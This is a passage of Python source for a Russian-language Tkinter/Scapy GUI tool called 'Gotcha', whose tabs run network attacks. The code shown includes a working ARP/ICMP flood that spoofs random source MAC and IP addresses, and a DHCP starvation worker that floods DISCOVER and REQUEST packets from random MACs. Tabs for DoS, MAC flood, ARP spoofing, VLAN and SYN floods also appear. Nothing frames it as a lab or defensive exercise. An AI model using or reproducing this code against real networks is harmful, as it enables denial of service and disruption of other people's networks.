                if self.tcp_flags_vars["CWR"].get(): flags |= 0x80
                
                tcp_packet.flags = flags
                new_packet = new_packet / tcp_packet
                
            elif proto == "UDP" and self.src_port.get() and self.dst_port.get():
                new_packet = new_packet / UDP(sport=int(self.src_port.get()), dport=int(self.dst_port.get()))
                
            elif proto == "ICMP":
                new_packet = new_packet / ICMP()
            
            payload_text = self.payload_data.get('1.0', 'end').strip()
            if payload_text:
                try:
                    payload_bytes = bytes.fromhex(payload_text.replace(' ', '').replace('\n', ''))
                    new_packet = new_packet / Raw(load=payload_bytes)
                except:
                    new_packet = new_packet / Raw(load=payload_text.encode())
        
        return new_packet

class Gotcha:
    def __init__(self, root):
        self.root = root
        self.root.title("Gotcha")
        self.root.geometry("1200x800")
        
        try:
            root.iconbitmap("images.ico")
        except:
            pass
        
        self.theme_manager = Theme(self.root)
        
        # Флаги состояния
        self.sniffing_running = False
        self.dhcp_attack_running = False
        self.mac_flood_running = False
        self.arp_spoof_running = False
        self.custom_attack_running = False
        self.packet_intercept_running = False
        self.flood_attack_running = False
        self.vlan_attack_running = False
        self.syn_flood_running = False
        
        # Данные пакетов
        self.captured_packet = None
        self.selected_packet = None
        self.intercept_packets = []
        self.edited_packet = None
        
        # Потоки
        self.sniff_thread = None
        self.dhcp_thread = None
        self.mac_flood_thread = None
        self.arp_spoof_thread = None
        self.custom_attack_threads = []
        self.intercept_thread = None
        self.flood_thread = None
        self.vlan_thread = None
        self.syn_flood_thread = None
        
        # Движки атак
        self.raw_attack = RSattack()
        self.scapy_attack = Sattack()
        
        # Сетевые интерфейсы
        self.network_interfaces = self.get_interface_list()
        
        # Настройка GUI
        self.setup_gui()
        self.theme_manager.apply_theme("dark")
        
        # Мониторинг системы
        self.system_monitor_running = True
        self.setup_system_monitor()
    
    def setup_system_monitor(self):
        self.update_system_monitor()
    
    def update_system_monitor(self):
        try:
            cpu_percent = psutil.cpu_percent(interval=None)
            memory = psutil.virtual_memory()
            ram_percent = memory.percent
            
            self.cpu_label.config(text=f"CPU: {cpu_percent:.1f}%")
            self.ram_label.config(text=f"RAM: {ram_percent:.1f}%")
        except:
            self.cpu_label.config(text="CPU: N/A")
            self.ram_label.config(text="RAM: N/A")
        
        if self.system_monitor_running:
            self.root.after(1000, self.update_system_monitor)
    
    def get_interface_list(self):
        interfaces = []
        try:
            iface_list = get_if_list()
            for iface in iface_list:
                interfaces.append(iface)
        except:
            pass
        
        if not interfaces:
            interfaces = ["Ethernet", "Wi-Fi", "eth0", "wlan0"]
        
        return interfaces
    
    def setup_gui(self):
        main_notebook = ttk.Notebook(self.root)
        main_notebook.pack(fill='both', expand=True, padx=8, pady=8)
        
        auxiliary_frame = ttk.Frame(main_notebook)
        main_notebook.add(auxiliary_frame, text="Вспомогательное")
        
        auxiliary_notebook = ttk.Notebook(auxiliary_frame)
        auxiliary_notebook.pack(fill='both', expand=True, padx=8, pady=8)
        
        access_frame = ttk.Frame(auxiliary_notebook)
        auxiliary_notebook.add(access_frame, text="Доступ")
        self.setup_access_tab(access_frame)
        
        settings_frame = ttk.Frame(auxiliary_notebook)
        auxiliary_notebook.add(settings_frame, text="Настройки")
        self.setup_settings_tab(settings_frame)
        
        attacks_frame = ttk.Frame(main_notebook)
        main_notebook.add(attacks_frame, text="Атаки")
        
        attacks_notebook = ttk.Notebook(attacks_frame)
        attacks_notebook.pack(fill='both', expand=True, padx=8, pady=8)
        
        intercept_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(intercept_frame, text="Перехват пакетов")
        self.setup_intercept_tab(intercept_frame)
        
        dhcp_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(dhcp_frame, text="DHCP атака")
        self.setup_dhcp_tab(dhcp_frame)
        
        custom_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(custom_frame, text="DoS атака")
        self.setup_custom_attack_tab(custom_frame)
        
        mac_flood_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(mac_flood_frame, text="MAC flood")
        self.setup_mac_flood_tab(mac_flood_frame)
        
        arp_spoof_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(arp_spoof_frame, text="ARP Spoofing")
        self.setup_arp_spoof_tab(arp_spoof_frame)
        
        flood_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(flood_frame, text="ARP/ICMP flood")
        self.setup_flood_attacks_tab(flood_frame)
        
        vlan_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(vlan_frame, text="VLAN ID flood")
        self.setup_vlan_flood_tab(vlan_frame)
        
        syn_flood_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(syn_flood_frame, text="SYN-flood")
        self.setup_syn_flood_tab(syn_flood_frame)
        
        self.status_var = tk.StringVar()
        self.status_var.set("Готов к работе")
        
        status_bar = ttk.Frame(self.root)
        status_bar.pack(side='bottom', fill='x')
        
        ttk.Label(status_bar, textvariable=self.status_var, relief='sunken', 
                 font=('Arial', 8), width=50).pack(side='left', fill='x', expand=True)
        
        self.cpu_label = ttk.Label(status_bar, text="CPU: 0%", relief='sunken', 
                                  font=('Arial', 8), width=12)
        self.cpu_label.pack(side='right', padx=(2, 0))
        
        self.ram_label = ttk.Label(status_bar, text="RAM: 0%", relief='sunken', 
                                  font=('Arial', 8), width=12)
        self.ram_label.pack(side='right', padx=(2, 10))
    
    def setup_flood_attacks_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        # Левая панель с параметрами
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        # Правая панель с логом
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
        
        params_frame = ttk.LabelFrame(left_frame, text="Параметры ARP/ICMP flood")
        params_frame.pack(fill='x', padx=5, pady=5)
        
        # Интерфейс
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.flood_interface = ttk.Combobox(row1, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.flood_interface.pack(side='left', padx=2)
        self.flood_interface.set(self.network_interfaces[0] if self.network_interfaces else "Ethernet")
        
        # Тип пакета
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="Протокол:", width=12).pack(side='left', padx=2)
        self.flood_packet_type = ttk.Combobox(row2, values=["ARP", "ICMP"], width=15, font=('Arial', 9))
        self.flood_packet_type.pack(side='left', padx=2)
        self.flood_packet_type.set("ARP")
        
        # Целевая сеть
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=5)
        ttk.Label(row3, text="Целевая сеть:", width=12).pack(side='left', padx=2)
        self.flood_target_network = ttk.Entry(row3, width=25, font=('Arial', 9))
        self.flood_target_network.pack(side='left', padx=2)
        self.flood_target_network.insert(0, "192.168.1.0/24")
        
        # Длительность
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=5)
        ttk.Label(row4, text="Длит. (сек):", width=12).pack(side='left', padx=2)
        self.flood_duration = ttk.Entry(row4, width=10, font=('Arial', 9))
        self.flood_duration.pack(side='left', padx=2)
        self.flood_duration.insert(0, "0")
        ttk.Label(row4, text="(0=бесконечно)").pack(side='left', padx=5)
        
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        
        self.flood_start_btn = ttk.Button(button_frame, text="Начать flood", 
                                        command=self.start_flood_attack, width=15)
        self.flood_start_btn.pack(side='left', padx=5)
        
        self.flood_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                       command=self.stop_flood_attack, width=15, state='disabled')
        self.flood_stop_btn.pack(side='left', padx=5)
        
        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.flood_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.flood_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Скорость отправки:", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.flood_rate = ttk.Label(stats_grid, text="0 пак/сек", width=15, anchor='w')
        self.flood_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.flood_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.flood_time.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        
        log_frame = ttk.LabelFrame(right_frame, text="Лог ARP/ICMP flood")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.flood_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.flood_log.pack(fill='both', expand=True, padx=5, pady=5)
        
        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить логи", 
                  command=lambda: self.save_log(self.flood_log), width=14).pack()
        
        self.flood_stats = {
            'start_time': 0,
            'sent_packets': 0,
            'last_update': 0,
            'last_sent': 0
        }
    
    def start_flood_attack(self):
        if self.flood_attack_running:
            return
        
        self.flood_attack_running = True
        self.flood_start_btn.config(state='disabled')
        self.flood_stop_btn.config(state='normal')
    
        interface = self.flood_interface.get()
        packet_type = self.flood_packet_type.get()
        target_network = self.flood_target_network.get()
        duration = int(self.flood_duration.get()) if self.flood_duration.get() else 0
    
        self.flood_stats = {
            'start_time': time.time(),
            'sent_packets': 0,
            'last_update': time.time(),
            'last_sent': 0
        }
    
        self.flood_thread = threading.Thread(
            target=self.run_flood_attack,
            args=(interface, packet_type, target_network, duration),
            daemon=True
        )
    
        self.flood_log.insert('end', f"Запуск {packet_type} flood атаки\n")
        self.flood_log.insert('end', f"Целевая сеть: {target_network}\n")
        self.flood_log.insert('end', f"Интерфейс: {interface}\n")
        self.flood_log.insert('end', f"Режим: {'Бесконечный' if duration == 0 else f'{duration} секунд'}\n")
    
        self.flood_thread.start()
        self.update_flood_stats()
    
        self.status_var.set(f"{packet_type} flood запущен")

    def stop_flood_attack(self):
        if not self.flood_attack_running:
            return  # Добавляем проверку, чтобы не вызывать повторно
        
        self.flood_attack_running = False
        self.flood_start_btn.config(state='normal')
        self.flood_stop_btn.config(state='disabled')
    
    # Перенести вывод статистики в отдельный метод
        self.update_final_statistics()
    
        self.status_var.set("Flood атака остановлена")

    def update_final_statistics(self):
        """Обновить финальную статистику (вызывается один раз)"""
        if not hasattr(self, 'flood_stats'):
            return
        
        total_time = time.time() - self.flood_stats['start_time']
        total_packets = self.flood_stats['sent_packets']
    
        self.flood_log.insert('end', f"\nFlood атака остановлена\n")
        self.flood_log.insert('end', f"Итоговая статистика:\n")
        self.flood_log.insert('end', f"  • Всего пакетов: {total_packets}\n")
        self.flood_log.insert('end', f"  • Общее время: {total_time:.1f} сек\n")
        if total_time > 0:
            self.flood_log.insert('end', f"  • Средняя скорость: {int(total_packets/total_time)} пак/сек\n")
        else:
            self.flood_log.insert('end', f"  • Средняя скорость: 0 пак/сек\n")

    def update_flood_stats(self):
        if not self.flood_attack_running:
            return
        
        current_time = time.time()
        duration = current_time - self.flood_stats['start_time']
        time_diff = current_time - self.flood_stats['last_update']
    
        if time_diff >= 1:
            packets_sent = self.flood_stats['sent_packets'] - self.flood_stats.get('last_sent', 0)
            current_rate = packets_sent / time_diff if time_diff > 0 else 0
        
            self.flood_rate.config(text=f"{int(current_rate)} пак/сек")
            self.flood_stats['last_update'] = current_time
            self.flood_stats['last_sent'] = self.flood_stats['sent_packets']
    
        self.flood_sent.config(text=str(self.flood_stats['sent_packets']))
    
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.flood_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
    
        if self.flood_attack_running:
            self.root.after(1000, self.update_flood_stats)

    def run_flood_attack(self, interface, packet_type, target_network, duration):
        packet_count = 0
        start_time = time.time()
        stop_called = False  # Флаг для отслеживания ручной остановки
    
        try:
            self.flood_log.insert('end', f"\n")
        
            while self.flood_attack_running:
                if duration > 0 and (time.time() - start_time) > duration:
                    self.flood_log.insert('end', "Длительность атаки завершена\n")
                    break
                
                if packet_type == "ARP":
                    if '/' in target_network:
                        base_ip = target_network.split('/')[0]
                        parts = list(map(int, base_ip.split('.')))
                        parts[3] = random.randint(1, 254)
                        target_ip = '.'.join(map(str, parts))
                        src_ip = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                    else:
                        target_ip = target_network
                        src_ip = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"

                    mac = "%02x:%02x:%02x:%02x:%02x:%02x" % (
                        random.randint(0, 255), random.randint(0, 255),
                        random.randint(0, 255), random.randint(0, 255),
                        random.randint(0, 255), random.randint(0, 255)
                    )
                    packet = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / ARP(
                        op=1,
                        hwsrc=mac,
                        psrc=src_ip,
                        hwdst="00:00:00:00:00:00",
                        pdst=target_ip
                    )
                else:  # ICMP
                    if '/' in target_network:
                        base_ip = target_network.split('/')[0]
                        parts = list(map(int, base_ip.split('.')))
                        parts[3] = random.randint(1, 254)
                        target_ip = '.'.join(map(str, parts))
                        src_ip = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                    else:
                        target_ip = target_network
                        src_ip = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"

                packet = Ether(dst="ff:ff:ff:ff:ff:ff", 
                                 src="%02x:%02x:%02x:%02x:%02x:%02x" % (
                                     random.randint(0, 255), random.randint(0, 255),
                                     random.randint(0, 255), random.randint(0, 255),
                                     random.randint(0, 255), random.randint(0, 255)
                                 )) / IP(
                        src=src_ip,
                        dst=target_ip
                    ) / ICMP(type=8)
            
                try:
                    sendp(packet, iface=interface, verbose=0)
                    packet_count += 1
                    self.flood_stats['sent_packets'] = packet_count
                
                    if packet_count % 10000 == 0:
                        current_rate = packet_count / (time.time() - start_time)
                        self.flood_log.insert('end', f"Отправлено {packet_count:,} {packet_type} пакетов | Скорость: {int(current_rate):,} пак/сек\n")
                        self.flood_log.see('end')
                    
                except Exception as e:
                    self.flood_log.insert('end', f"Ошибка отправки пакета: {str(e)[:50]}\n")
            
        except Exception as e:
            self.flood_log.insert('end', f"Ошибка во время атаки: {str(e)}\n")
        finally:
            # Не вызываем stop_flood_attack() здесь, только обновляем GUI
            if not stop_called:
                # Если остановка не была вызвана вручную, обновляем кнопки
                self.root.after(0, self._cleanup_flood_attack)
    
    def _cleanup_flood_attack(self):
        """Очистка после завершения потока (не ручная остановка)"""
        if self.flood_attack_running:
            self.flood_attack_running = False
            self.flood_start_btn.config(state='normal')
            self.flood_stop_btn.config(state='disabled')
            self.update_final_statistics()
            self.status_var.set("Flood атака завершена")
            
    def setup_dhcp_tab(self, parent):
        """Настройка вкладки DHCP атака"""
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        # Левая панель с параметрами
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        # Правая панель с логом
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
        
        params_frame = ttk.LabelFrame(left_frame, text="Параметры DHCP Starvation атаки")
        params_frame.pack(fill='x', padx=5, pady=5)
        
        # Интерфейс
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.dhcp_interface = ttk.Combobox(row1, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.dhcp_interface.pack(side='left', padx=2)
        self.dhcp_interface.set(self.network_interfaces[0] if self.network_interfaces else "Ethernet")
        
        # Размер пула IP
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="Размер пула IP:", width=12).pack(side='left', padx=2)
        self.dhcp_pool_size = ttk.Entry(row2, width=10, font=('Arial', 9))
        self.dhcp_pool_size.pack(side='left', padx=2)
        self.dhcp_pool_size.insert(0, "254")
        
        # Количество запросов
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=5)
        ttk.Label(row3, text="Кол-во запросов:", width=12).pack(side='left', padx=2)
        self.dhcp_request_count = ttk.Entry(row3, width=10, font=('Arial', 9))
        self.dhcp_request_count.pack(side='left', padx=2)
        self.dhcp_request_count.insert(0, "1000")
        
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=5)
        ttk.Label(row4, text="Задержка (сек):", width=12).pack(side='left', padx=2)
        self.dhcp_delay = ttk.Entry(row4, width=10, font=('Arial', 9))
        self.dhcp_delay.pack(side='left', padx=2)
        self.dhcp_delay.insert(0, "0.05")
        
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        
        self.dhcp_start_btn = ttk.Button(button_frame, text="Начать DHCP Starvation", 
                                       command=self.start_dhcp_attack, width=20)
        self.dhcp_start_btn.pack(side='left', padx=5)
        
        self.dhcp_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                      command=self.stop_dhcp_attack, width=15, state='disabled')
        self.dhcp_stop_btn.pack(side='left', padx=5)
        
        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.dhcp_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Скорость отправки:", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_rate = ttk.Label(stats_grid, text="0 пак/сек", width=15, anchor='w')
        self.dhcp_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Уникальных MAC:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_unique = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.dhcp_unique.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=3, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.dhcp_time.grid(row=3, column=1, padx=5, pady=2, sticky='w')
        
        # === ЛОГ ===
        log_frame = ttk.LabelFrame(right_frame, text="Лог DHCP Starvation")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.dhcp_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.dhcp_log.pack(fill='both', expand=True, padx=5, pady=5)

        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить логи", 
                  command=lambda: self.save_log(self.dhcp_log), width=14).pack()

        self.dhcp_stats = {
            'start_time': 0,
            'sent_packets': 0,
            'unique_macs': set(),
            'last_update': 0,
            'last_sent': 0
        }
    
    def start_dhcp_attack(self):
        self.dhcp_attack_running = True
        self.dhcp_start_btn.config(state='disabled')
        self.dhcp_stop_btn.config(state='normal')
        
        try:
            pool_size = int(self.dhcp_pool_size.get())
            request_count = int(self.dhcp_request_count.get())
            delay = float(self.dhcp_delay.get())
        except:
            pool_size = 254
            request_count = 1000
            delay = 0.005 #Задержка
        
        self.dhcp_stats = {
            'start_time': time.time(),
            'sent_packets': 0,
            'unique_macs': set(),
            'last_update': time.time(),
            'last_sent': 0
        }
        
        self.dhcp_thread = threading.Thread(
            target=self.dhcp_attack_worker,
            args=(self.dhcp_interface.get(), pool_size, request_count, delay)
        )
        self.dhcp_thread.daemon = True
        self.dhcp_thread.start()
        
        self.update_dhcp_stats()
        
        self.dhcp_log.insert('end', f"Запущена DHCP Starvation атака (размер пула: {pool_size} IP)\n")
        self.dhcp_log.insert('end', f"Задержка между пакетами: {delay} сек \n")
        self.status_var.set("DHCP Starvation атака запущена")
    
    def stop_dhcp_attack(self):
        self.dhcp_attack_running = False
        self.dhcp_start_btn.config(state='normal')
        self.dhcp_stop_btn.config(state='disabled')
        
        if self.dhcp_thread and self.dhcp_thread.is_alive():
            self.dhcp_thread.join(timeout=1.0)
        
        total_time = time.time() - self.dhcp_stats['start_time']
        total_packets = self.dhcp_stats['sent_packets']
        
        self.dhcp_log.insert('end', "DHCP Starvation атака остановлена\n")
        self.dhcp_log.insert('end', f"Итоговая статистика:\n")
        self.dhcp_log.insert('end', f"  • Всего пакетов: {total_packets}\n")
        self.dhcp_log.insert('end', f"  • Уникальных MAC: {len(self.dhcp_stats['unique_macs'])}\n")
        self.dhcp_log.insert('end', f"  • Общее время: {total_time:.1f} сек\n")
        self.dhcp_log.insert('end', f"  • Средняя скорость: {int(total_packets/total_time) if total_time > 0 else 0} пак/сек\n")
        
        self.status_var.set("DHCP Starvation атака остановлена")
    
    def update_dhcp_stats(self):
        if not self.dhcp_attack_running:
            return
            
        current_time = time.time()
        duration = current_time - self.dhcp_stats['start_time']
        time_diff = current_time - self.dhcp_stats['last_update']
        
        if time_diff >= 1:
            packets_sent = self.dhcp_stats['sent_packets'] - self.dhcp_stats.get('last_sent', 0)
            current_rate = packets_sent / time_diff if time_diff > 0 else 0
            
            self.dhcp_rate.config(text=f"{int(current_rate)} пак/сек")
            self.dhcp_stats['last_update'] = current_time
            self.dhcp_stats['last_sent'] = self.dhcp_stats['sent_packets']
        
        self.dhcp_sent.config(text=str(self.dhcp_stats['sent_packets']))
        self.dhcp_unique.config(text=str(len(self.dhcp_stats['unique_macs'])))
        
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.dhcp_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        
        if self.dhcp_attack_running:
            self.root.after(1000, self.update_dhcp_stats)
    
    def dhcp_attack_worker(self, interface, pool_size, request_count, delay):
        try:
            packet_count = 0
            used_macs = set()
            
            self.dhcp_log.insert('end', f"Начало DHCP Starvation атаки по схеме DORA для {pool_size} IP-адресов\n")
            self.dhcp_log.insert('end', f"Задержка между пакетами: {delay} сек (ускорено в 2 раза)\n")
            
            while self.dhcp_attack_running and packet_count < request_count:
                mac = self.generate_random_mac()
                if mac in used_macs:
                    continue
                    
                used_macs.add(mac)
                mac_bytes = bytes.fromhex(mac.replace(':', ''))
                
                dhcp_discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                               IP(src="0.0.0.0", dst="255.255.255.255") / \
                               UDP(sport=68, dport=67) / \
                               BOOTP(chaddr=mac_bytes, xid=random.randint(1, 0xFFFFFFFF)) / \
                               DHCP(options=[("message-type", "discover"), "end"])
                
                sendp(dhcp_discover, iface=interface, verbose=0)
                packet_count += 1
                self.dhcp_stats['sent_packets'] = packet_count
                self.dhcp_stats['unique_macs'] = used_macs
                
                if delay > 0:
                    time.sleep(delay)
                
                dhcp_request = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                              IP(src="0.0.0.0", dst="255.255.255.255") / \
                              UDP(sport=68, dport=67) / \
                              BOOTP(chaddr=mac_bytes, xid=random.randint(1, 0xFFFFFFFF)) / \
                              DHCP(options=[("message-type", "request"), "end"])
                
                sendp(dhcp_request, iface=interface, verbose=0)
                packet_count += 1
                self.dhcp_stats['sent_packets'] = packet_count
                
                if packet_count % 20 == 0:
                    self.dhcp_log.insert('end', f"Отправлено {packet_count}/{request_count} DHCP пакетов\n")
                    self.dhcp_log.see('end')
                    self.status_var.set(f"DHCP Starvation: {packet_count}/{request_count}")
                
                if delay > 0:
                    time.sleep(delay)
                
                if len(used_macs) >= pool_size:
                    self.dhcp_log.insert('end', f"Достигнут лимит уникальных MAC-адресов ({pool_size})\n")
                    used_macs.clear()
                    time.sleep(1)
            
            if packet_count >= request_count:
                self.dhcp_log.insert('end', f"DHCP Starvation атака завершена! Отправлено {packet_count} пакетов\n")
                self.status_var.set("DHCP Starvation атака завершена")
                        
        except Exception as e:
            self.dhcp_log.insert('end', f"Ошибка DHCP Starvation атаки: {str(e)}\n")
    
    def setup_custom_attack_tab(self, parent):
        """Настройка вкладки DoS атака"""
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        # Левая панель с параметрами
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        # Правая панель с логом
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
        
        params_frame = ttk.LabelFrame(left_frame, text="Параметры DoS атаки")
        params_frame.pack(fill='x', padx=5, pady=5)
        
        # IP адрес
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="IP адрес:", width=12).pack(side='left', padx=2)
        self.custom_ip = ttk.Entry(row1, width=25, font=('Arial', 9))
        self.custom_ip.pack(side='left', padx=2)
        self.custom_ip.insert(0, "192.168.1.1")
        
        # Протокол
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="Протокол:", width=12).pack(side='left', padx=2)
        self.custom_protocol = ttk.Combobox(row2, values=[
            "ICMP", "TCP", "UDP", "ARP", "DNS"
        ], width=15, font=('Arial', 9))
        self.custom_protocol.pack(side='left', padx=2)
        self.custom_protocol.set("TCP")
        
        # Порт
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=5)
        ttk.Label(row3, text="Порт:", width=12).pack(side='left', padx=2)
        self.custom_port = ttk.Entry(row3, width=10, font=('Arial', 9))
        self.custom_port.pack(side='left', padx=2)
        self.custom_port.insert(0, "80")
        
        # Размер пакета
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=5)
        ttk.Label(row4, text="Размер пакета:", width=12).pack(side='left', padx=2)
        self.custom_packet_size = ttk.Entry(row4, width=10, font=('Arial', 9))
        self.custom_packet_size.pack(side='left', padx=2)
        self.custom_packet_size.insert(0, "1024")
        ttk.Label(row4, text="байт").pack(side='left', padx=2)
        
        # Количество пакетов
        row5 = ttk.Frame(params_frame)
        row5.pack(fill='x', padx=5, pady=5)
        ttk.Label(row5, text="Кол-во пакетов:", width=12).pack(side='left', padx=2)
        self.custom_packet_count = ttk.Entry(row5, width=10, font=('Arial', 9))
        self.custom_packet_count.pack(side='left', padx=2)
        self.custom_packet_count.insert(0, "10000")
        
        # Задержка
        row6 = ttk.Frame(params_frame)
        row6.pack(fill='x', padx=5, pady=5)
        ttk.Label(row6, text="Задержка (сек):", width=12).pack(side='left', padx=2)
        self.custom_delay = ttk.Entry(row6, width=10, font=('Arial', 9))
        self.custom_delay.pack(side='left', padx=2)
        self.custom_delay.insert(0, "0")

        row7 = ttk.Frame(params_frame)
        row7.pack(fill='x', padx=5, pady=5)
        self.custom_continuous = tk.BooleanVar()
        ttk.Checkbutton(row7, text="Непрерывный режим", 
                       variable=self.custom_continuous).pack(side='left', padx=5)
        
        # Интерфейс
        row8 = ttk.Frame(params_frame)
        row8.pack(fill='x', padx=5, pady=5)
        ttk.Label(row8, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.custom_interface = ttk.Combobox(row8, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.custom_interface.pack(side='left', padx=2)
        self.custom_interface.set(self.network_interfaces[0] if self.network_interfaces else "Ethernet")
        
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        
        self.custom_start_btn = ttk.Button(button_frame, text="Начать DoS атаку", 
                                         command=self.start_custom_attack, width=15)
        self.custom_start_btn.pack(side='left', padx=5)
        
        self.custom_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                        command=self.stop_custom_attack, width=15, state='disabled')
        self.custom_stop_btn.pack(side='left', padx=5)
        
        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.custom_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.custom_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Скорость отправки:", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.custom_rate = ttk.Label(stats_grid, text="0 пак/сек", width=15, anchor='w')
        self.custom_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.custom_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.custom_time.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        
        log_frame = ttk.LabelFrame(right_frame, text="Лог DoS атаки")
